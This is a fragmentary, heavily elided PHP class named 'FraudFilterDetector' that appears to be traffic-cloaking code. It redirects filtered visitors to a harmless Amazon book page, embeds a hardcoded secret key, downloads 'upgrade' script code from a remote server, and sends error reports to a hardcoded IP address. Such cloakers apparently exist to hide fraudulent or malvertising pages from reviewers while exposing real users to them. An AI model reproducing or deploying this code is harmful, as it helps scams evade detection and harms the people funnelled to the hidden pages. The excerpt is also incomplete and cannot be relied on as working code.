...
class FraudFilterDetector_pn0sr {
    ...
    function isSignatureValid($sign, $time) {
        $str = '7530b7f2-a89f-4b68-953a-e93b569c8785.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.amazon.de/Alcoholics-Big-Book-Trade/dp/1893007162');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 7530b7f2-a89f-4b68-953a-e93b569c8785',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 7530b7f2-a89f-4b68-953a-e93b569c8785';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 7530b7f2-a89f-4b68-953a-e93b569c8785';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=pn0sr&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_pn0sr = new FraudFilterDetector_pn0sr();
$fraudFilterDetector_pn0sr->check();
